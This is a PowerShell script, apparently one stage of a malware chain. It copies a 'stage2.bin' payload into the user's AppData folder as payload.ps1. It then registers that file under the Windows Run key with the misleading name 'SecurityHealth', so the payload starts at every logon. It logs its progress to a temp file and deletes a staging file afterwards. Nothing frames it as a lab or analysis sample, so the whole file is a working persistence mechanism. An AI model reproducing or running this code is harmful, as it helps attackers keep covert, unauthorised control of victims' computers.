[CmdletBinding()]
param(
    [string]$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    [string]$RegistryValue = 'SecurityHealth',
    [string]$PersistencePath = "$env:APPDATA\payload.ps1",
    [string]$TracePath = "$env:TEMP\report.txt"
)
$ErrorActionPreference = "Stop"

function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Install-StagePayload {
    param(
        [string]$SourcePath = '',
        [string]$DestinationPath = ""
    )

    if (-not (Test-Path -Path $SourcePath)) {
        throw "Source payload is missing"
    }
    Copy-Item -Path $SourcePath -Destination $DestinationPath -Force
    return (Test-Path -Path $DestinationPath)
}

function Set-RunKeyPersistence {
    [CmdletBinding()]
    param(
        [string]$KeyPath = '',
        [string]$ValueName = "",
        [string]$TargetPath = ""
    )

    Write-Verbose ("Writing Run value " + $ValueName)
    New-ItemProperty -Path $KeyPath -Name $ValueName -Value ('powershell.exe -NoP -File "' + $TargetPath + '"') -PropertyType String -Force
    return (Get-ItemProperty -Path $KeyPath -Name $ValueName)
}

try {
    Write-StageLog -Message "Starting persistence stage"
    $InstallResult = Install-StagePayload -SourcePath "C:\ProgramData\stage2.bin" -DestinationPath $PersistencePath
    if ($InstallResult) {
        $FetchResult = Set-RunKeyPersistence -KeyPath $RunKeyPath -ValueName $RegistryValue -TargetPath $PersistencePath
        Write-StageLog -Message "Run key written"
    }
    else {
        Write-Warning "Payload copy did not complete"
    }
}
catch {
    Write-Warning "Persistence workflow failed: $($_.Exception.Message)"
}

$PersistenceReport = [ordered]@{
    Stage = "persistence"
    RunKey = $RunKeyPath
    ValueName = $RegistryValue
    Target = $PersistencePath
}
$PersistenceReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Exporting operation report"
Write-Verbose "Starting workflow"
Write-Verbose "Reading configuration values"
Write-Verbose "Validating result"
Write-Verbose "Retry budget remaining"
Write-Verbose "Stage handoff finished"
Write-Verbose "Preparing working directory"
Write-Verbose "Resolving configured target"
Write-Verbose "Collecting host metadata"
Write-Verbose "Checking local path"
Write-Verbose "Cleaning temporary marker"
$StageMarker = "stage-10"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
